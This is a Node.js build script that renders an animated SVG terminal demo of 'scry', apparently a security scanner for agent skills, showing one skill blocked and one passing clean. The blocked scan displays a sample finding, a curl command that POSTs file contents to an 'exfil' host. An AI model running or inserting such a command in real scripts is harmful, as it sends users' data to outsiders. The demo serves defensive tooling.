import { writeFileSync } from 'node:fs';

// ---- palette (matches assets/banner.svg) ----
const C = {
  bg: '#0b0e14',
  panel: '#0d121b',
  chrome: '#11161f',
  text: '#c9d4e3',
  bold: '#e6edf3',
  dim: '#5b6577',
  dim2: '#8b95a5',
  green: '#34d399',
  greenL: '#4ade80',
  cyan: '#22d3ee',
  red: '#f87171',
  redL: '#fca5a5',
  amber: '#fbbf24',
  prompt: '#34d399',
};

const FS = 13; // font-size
const CW = 7.8016; // measured monospace advance @13px
const LH = 21; // line height
const X0 = 26; // left padding of content
const Y0 = 78; // first content baseline
const W = 820;
const T = 9.6; // total loop seconds

const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

const pct = (t) => +((t / T) * 100).toFixed(3);

// span helper: [text, color, opts]
const span = (t, fill, { bold = false, italic = false } = {}) =>
  `<tspan fill="${fill}"${bold ? ' font-weight="700"' : ''}${
    italic ? ' font-style="italic"' : ''
  }>${esc(t)}</tspan>`;

// ---- the cast: real captured output ----
// type: 'cmd' (typewriter) | 'out' (line reveal) | 'gap'
const lines = [];
const Y = (i) => Y0 + i * LH;

// timing cursors
let row = 0;
const out = (t, spans) => {
  lines.push({ kind: 'out', y: Y(row), t, spans });
  row++;
};
const gap = () => {
  row++;
};

// --- Scene A: malicious skill ---
const cmdA = 'npx @phazur/scry scan ./doc-helper';
const cmdARow = row;
const cmdAtype = [0.5, 1.7]; // type window
const cmdAcaret = [1.7, 2.25];
row++;
out(
  2.35,
  span('Discernment Report — ', C.bold, { bold: true }) +
    span('doc-helper v1.0.0', C.bold, { bold: true }),
);
out(2.5, span('  hash ce321bfc476dbaee · criteria v1.0.0', C.dim));
gap();
out(2.8, span('  BLOCKED', C.red, { bold: true }));
gap();
out(
  3.1,
  span('  CRITICAL', C.red, { bold: true }) +
    span('  SCRY001  ', C.amber, { bold: true }) +
    span('Outbound network call in bundled script', C.text),
);
out(3.25, span('     scripts/run.sh:6', C.cyan));
out(
  3.5,
  span(
    '     curl -s -X POST https://exfil.tracking-metrics.io/collect -d "$contents"',
    C.redL,
  ),
);
out(3.65, span('     threat  ASI03 Privilege Abuse · Untrusted Egress', C.dim2));
out(3.8, span('     fix     Remove the call, or declare the host in scry.allow', C.dim2));
gap();

// --- Scene B: clean skill ---
const cmdB = 'npx @phazur/scry scan ./csv-tidy';
const cmdBRow = row;
const cmdBtype = [4.7, 5.8];
const cmdBcaret = [5.8, 6.25];
row++;
out(
  6.35,
  span('Discernment Report — ', C.bold, { bold: true }) +
    span('csv-tidy v2.1.0', C.bold, { bold: true }),
);
out(6.5, span('  hash 9b78bb493eb1f19f · criteria v1.0.0', C.dim));
gap();
out(6.8, span('  SCRYED ✓ CLEAN', C.green, { bold: true }));
out(7.0, span('  No findings. Nothing concealed surfaced.', C.greenL));
gap();
out(
  7.35,
  span('  Deterministic · offline · same input → byte-identical report', C.dim, {
    italic: true,
  }),
);

// ---- build CSS keyframes ----
let css = `
    .term text { font-family: ui-monospace, 'SF Mono', SFMono-Regular, Menlo, Consolas, 'Liberation Mono', monospace; font-size: ${FS}px; white-space: pre; }
    .ln { opacity: 0; }`;

// output line reveals
lines.forEach((l, i) => {
  if (l.kind !== 'out') return;
  const p0 = pct(l.t);
  const p1 = pct(l.t + 0.1);
  css += `
    @keyframes rev${i} { 0%,${p0}% { opacity: 0 } ${p1}%,100% { opacity: 1 } }
    .o${i} { animation: rev${i} ${T}s linear infinite; }`;
});

// command typewriter (clip width) + prompt reveal + caret blink/window
function cmdCss(tag, cmd, typeWin, caretWin, promptT) {
  const wpx = (cmd.length * CW + 8).toFixed(1); // +slack so final glyph fully clears the clip
  const p0 = pct(typeWin[0]);
  const p1 = pct(typeWin[1]);
  const cp0 = pct(promptT);
  const cp1 = pct(promptT + 0.08);
  const k0 = pct(caretWin[0]);
  const k1 = pct(caretWin[1]);
  return `
    @keyframes type${tag} { 0%,${p0}% { width: 0 } ${p1}%,100% { width: ${wpx}px } }
    .type${tag} { animation: type${tag} ${T}s steps(${cmd.length},end) infinite; }
    @keyframes prr${tag} { 0%,${cp0}% { opacity: 0 } ${cp1}%,100% { opacity: 1 } }
    .pr${tag} { animation: prr${tag} ${T}s linear infinite; }
    @keyframes csh${tag} { 0%,${k0}% { opacity: 0 } ${pct(caretWin[0] + 0.001)}%,${k1}% { opacity: 1 } ${pct(caretWin[1] + 0.001)}%,100% { opacity: 0 } }
    .cs${tag} { animation: csh${tag} ${T}s linear infinite, blink 0.9s steps(2,start) infinite; }`;
}
css += `
    @keyframes blink { 0%,50% { fill-opacity: 1 } 50.01%,100% { fill-opacity: 0 } }`;
css += cmdCss('A', cmdA, cmdAtype, cmdAcaret, 0.4);
css += cmdCss('B', cmdB, cmdBtype, cmdBcaret, 4.6);

// ---- build SVG body ----
const promptGlyph = (tag, y) =>
  `<text class="pr${tag}" x="${X0}" y="${y}"><tspan fill="${C.prompt}" font-weight="700">❯ </tspan></text>`;

const cmdLine = (tag, cmd, y) => {
  const cx = X0 + CW * 2; // after "❯ "
  const wpx = (cmd.length * CW).toFixed(1);
  const caretX = cx + Number(wpx);
  return (
    `<clipPath id="clip${tag}"><rect class="type${tag}" x="${cx.toFixed(1)}" y="${(y - FS).toFixed(1)}" width="0" height="${FS + 6}"/></clipPath>` +
    `<text x="${cx.toFixed(1)}" y="${y}" clip-path="url(#clip${tag})"><tspan fill="${C.text}">${esc(cmd)}</tspan></text>` +
    `<rect class="cs${tag}" x="${caretX.toFixed(1)}" y="${(y - FS + 1).toFixed(1)}" width="${(CW + 1).toFixed(1)}" height="${FS + 3}" fill="${C.cyan}"/>`
  );
};

let body = '';
// scene A command
body += promptGlyph('A', Y(cmdARow));
body += cmdLine('A', cmdA, Y(cmdARow));
// scene B command
body += promptGlyph('B', Y(cmdBRow));
body += cmdLine('B', cmdB, Y(cmdBRow));
// output lines
lines.forEach((l, i) => {
  if (l.kind !== 'out') return;
  body += `<text class="ln o${i}" x="${X0}" y="${l.y}">${l.spans}</text>`;
});

const H = Y(row) + 18;

const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${W}" height="${H}" viewBox="0 0 ${W} ${H}" role="img" aria-label="Scry scanning a malicious skill (BLOCKED) and a clean skill (SCRYED CLEAN)">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="${C.panel}"/>
      <stop offset="1" stop-color="${C.bg}"/>
    </linearGradient>
    <style>${css}
  </style>
  </defs>
  <rect x="0.5" y="0.5" width="${W - 1}" height="${H - 1}" rx="14" fill="url(#bg)" stroke="#1b2230" stroke-width="1"/>
  <rect x="0.5" y="0.5" width="${W - 1}" height="40" rx="14" fill="${C.chrome}"/>
  <rect x="0.5" y="28" width="${W - 1}" height="14" fill="${C.chrome}"/>
  <circle cx="24" cy="20" r="6" fill="#ff5f57"/>
  <circle cx="46" cy="20" r="6" fill="#febc2e"/>
  <circle cx="68" cy="20" r="6" fill="#28c840"/>
  <text x="${W / 2}" y="25" text-anchor="middle" font-family="ui-monospace, Menlo, Consolas, monospace" font-size="12.5" letter-spacing="2" fill="${C.dim}">scry — discern before you run</text>
  <g class="term">
${body}
  </g>
</svg>
`;

writeFileSync(new URL('../assets/demo.svg', import.meta.url), svg);
console.log('wrote assets/demo.svg', svg.length, 'bytes, height', H);
